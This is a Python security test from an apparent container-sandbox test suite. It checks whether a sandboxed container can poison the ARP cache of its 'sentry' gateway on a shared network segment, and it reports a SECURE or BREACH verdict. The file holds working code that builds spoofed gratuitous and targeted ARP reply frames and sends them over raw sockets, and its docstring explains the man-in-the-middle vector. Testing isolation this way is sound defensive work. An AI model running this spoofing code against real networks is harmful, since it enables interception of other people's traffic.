#!/usr/bin/env python3
#
# Copyright 2026 Scale Invariant, Inc.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Author: Brad Hyslop <bhyslop@scaleinvariant.org>
#
# RBTIS - ARP cache poisoning
#
# Sortie: direct_arp_poison
# Front: direct

import os
import socket
import struct
import subprocess
import time
import fcntl


SENTRY_IP = os.environ["RBRN_ENCLAVE_SENTRY_IP"]
BOTTLE_IP = os.environ["RBRN_ENCLAVE_BOTTLE_IP"]
TIMEOUT = 3


def _get_interface_info():
    """Get enclave interface name and MAC address via /sys/class/net/."""
    try:
        for iface in os.listdir("/sys/class/net"):
            if iface == "lo":
                continue
            mac_path = f"/sys/class/net/{iface}/address"
            try:
                with open(mac_path) as f:
                    mac = f.read().strip()
                if mac and mac != "00:00:00:00:00:00":
                    return iface, mac
            except (FileNotFoundError, PermissionError):
                continue
    except OSError:
        pass
    return None, None


def _get_sentry_mac():
    """Get sentry's MAC address from ARP cache via /proc/net/arp."""
    # Ping sentry to ensure ARP entry exists
    try:
        subprocess.run(["ping", "-c", "1", "-W", "1", SENTRY_IP],
                       capture_output=True, timeout=5)
    except Exception:
        pass

    try:
        with open("/proc/net/arp") as f:
            for line in f:
                parts = line.split()
                if parts and parts[0] == SENTRY_IP:
                    # Format: IP HWtype Flags HWaddress Mask Device
                    if len(parts) >= 4 and parts[3] != "00:00:00:00:00:00":
                        return parts[3]
    except (FileNotFoundError, PermissionError):
        pass
    return None


def _mac_to_bytes(mac_str):
    """Convert 'aa:bb:cc:dd:ee:ff' to bytes."""
    return bytes(int(b, 16) for b in mac_str.split(":"))


def _build_arp_reply(sender_mac, sender_ip, target_mac, target_ip):
    """Build an ARP reply (opcode 2) Ethernet frame."""
    # Ethernet header: dst_mac(6) + src_mac(6) + ethertype(2)
    eth = _mac_to_bytes(target_mac) + _mac_to_bytes(sender_mac) + b"\x08\x06"

    # ARP: hw_type(2) + proto_type(2) + hw_size(1) + proto_size(1) +
    #       opcode(2) + sender_mac(6) + sender_ip(4) + target_mac(6) + target_ip(4)
    arp = struct.pack("!HHBBH",
                      1,       # Ethernet
                      0x0800,  # IPv4
                      6, 4,    # MAC=6, IP=4
                      2)       # Reply
    arp += _mac_to_bytes(sender_mac) + socket.inet_aton(sender_ip)
    arp += _mac_to_bytes(target_mac) + socket.inet_aton(target_ip)

    return eth + arp


def _build_gratuitous_arp(our_mac, claimed_ip):
    """Build a gratuitous ARP announcing claimed_ip is at our_mac."""
    broadcast = "ff:ff:ff:ff:ff:ff"
    eth = _mac_to_bytes(broadcast) + _mac_to_bytes(our_mac) + b"\x08\x06"

    arp = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2)  # Reply
    arp += _mac_to_bytes(our_mac) + socket.inet_aton(claimed_ip)
    arp += _mac_to_bytes(broadcast) + socket.inet_aton(claimed_ip)

    return eth + arp


def _send_raw_frame(iface, frame):
    """Send a raw Ethernet frame."""
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        sock.bind((iface, 0))
        sock.send(frame)
        sock.close()
        return True
    except PermissionError:
        return None  # No CAP_NET_RAW for AF_PACKET
    except OSError:
        return False


def _check_sentry_arp_after_poison(expected_sentry_mac):
    """Check if sentry's ARP entry changed after poisoning attempt."""
    try:
        with open("/proc/net/arp") as f:
            for line in f:
                parts = line.split()
                if parts and parts[0] == SENTRY_IP:
                    if len(parts) >= 4 and parts[3] != "00:00:00:00:00:00":
                        return parts[3]
    except (FileNotFoundError, PermissionError):
        pass
    return None


def run():
    """ARP cache poisoning — test L2 attack surface on shared enclave segment.

    Vector:
      The bottle and sentry share an L2 Ethernet segment (enclave network
      10.242.0.0/24). ARP has no authentication — any host can claim any IP.
      With raw sockets (AF_PACKET), we can:

        1. Gratuitous ARP: Broadcast that the sentry's IP (10.242.0.2) is at
           our MAC address. If other containers (or the host bridge) accept
           this, traffic destined for the sentry routes to us instead.

        2. Targeted ARP reply: Send an ARP reply to the sentry claiming the
           uplink gateway's IP is at our MAC. The sentry would then send
           outbound traffic to us — enabling man-in-the-middle on all
           enclave egress without touching iptables.

        3. ARP table overflow: Flood the sentry's ARP cache to force entries
           into FAILED state, potentially causing the sentry to broadcast
           frames that should be unicast.

      The pentacle script (rbjp_pentacle.sh) flushes ARP cache on startup
      but does not configure static ARP entries or ARP filtering (arp_filter,
      arp_ignore, arp_announce sysctls).

      This sortie tests whether AF_PACKET raw sockets are available and
      whether ARP manipulation is possible. Even if we can't observe the
      effect (no second victim on the segment), the ability to send
      gratuitous ARPs is itself a finding.

    Detection logic:
      - AF_PACKET unavailable (no CAP_NET_RAW for L2) -> SECURE
      - Gratuitous ARP sent but no observable effect   -> advisory
      - Sentry ARP cache accepts poisoned entry        -> BREACH
    """
    assertions = []

    # Test 1: Can we discover interface info?
    iface, our_mac = _get_interface_info()
    assertions.append({
        "name": "interface_discovery",
        "passed": True,  # informational
        "detail": f"Enclave interface: {iface}, MAC: {our_mac}" if iface
                  else "Could not discover enclave interface",
    })

    if not iface or not our_mac:
        return {
            "verdict": "ERROR",
            "detail": "Cannot discover enclave interface — unable to test ARP",
            "assertions": assertions,
        }

    # Test 2: Can we open AF_PACKET sockets?
    can_send_frames = False
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        sock.bind((iface, 0))
        sock.close()
        can_send_frames = True
    except (PermissionError, OSError) as e:
        assertions.append({
            "name": "af_packet_available",
            "passed": True,  # If AF_PACKET is blocked, that's SECURE
            "detail": f"AF_PACKET socket: denied ({e}) — L2 attacks blocked",
        })
        return {
            "verdict": "SECURE",
            "detail": "AF_PACKET raw sockets unavailable — L2 ARP attacks impossible",
            "assertions": assertions,
        }

    assertions.append({
        "name": "af_packet_available",
        "passed": False,  # AF_PACKET being available is a finding
        "detail": "AF_PACKET socket: AVAILABLE — L2 frame injection possible",
    })

    # Test 3: Get sentry MAC for targeted attacks
    sentry_mac = _get_sentry_mac()
    assertions.append({
        "name": "sentry_mac_discovered",
        "passed": True,  # informational
        "detail": f"Sentry MAC: {sentry_mac}" if sentry_mac else "Sentry MAC unknown",
    })

    # Test 4: Send gratuitous ARP claiming sentry's IP
    grat_frame = _build_gratuitous_arp(our_mac, SENTRY_IP)
    sent = _send_raw_frame(iface, grat_frame)
    assertions.append({
        "name": "gratuitous_arp_sentry_ip",
        "passed": not sent,  # being able to send is a finding
        "detail": f"Gratuitous ARP claiming {SENTRY_IP} at {our_mac}: "
                  + ("SENT — L2 spoofing possible" if sent
                     else "failed" if sent is False
                     else "permission denied"),
    })

    # Test 5: Send targeted ARP reply to sentry if we know its MAC
    if sentry_mac:
        # Claim that an external IP (the "gateway") is at our MAC
        # We use a fake gateway IP — in practice this would be the uplink gateway
        # Claim the gateway (one below sentry) is at our MAC
        base_octets = SENTRY_IP.rsplit(".", 1)
        fake_gateway = f"{base_octets[0]}.1"
        poison_frame = _build_arp_reply(our_mac, fake_gateway, sentry_mac, SENTRY_IP)
        sent2 = _send_raw_frame(iface, poison_frame)

        # Check if we can observe any effect (ARP cache on sentry is not
        # directly observable from here, but we can check our own cache)
        assertions.append({
            "name": "targeted_arp_poison",
            "passed": not sent2,
            "detail": f"ARP reply to sentry claiming {fake_gateway} at {our_mac}: "
                      + ("SENT" if sent2
                         else "failed" if sent2 is False
                         else "permission denied"),
        })

    # Test 6: Verify our own ARP cache wasn't corrupted by sentry defenses
    time.sleep(0.5)
    current_sentry_mac = _check_sentry_arp_after_poison(sentry_mac)
    arp_stable = current_sentry_mac == sentry_mac
    assertions.append({
        "name": "own_arp_cache_stable",
        "passed": True,  # informational
        "detail": f"Sentry ARP entry after test: {current_sentry_mac}"
                  + (" (unchanged)" if arp_stable else f" (was {sentry_mac})"),
    })

    all_passed = all(a["passed"] for a in assertions)
    return {
        "verdict": "SECURE" if all_passed else "BREACH",
        "detail": "ARP attack surface contained — AF_PACKET blocked or no effect"
                  if all_passed
                  else "ARP attack surface OPEN — L2 frame injection possible from bottle",
        "assertions": assertions,
    }
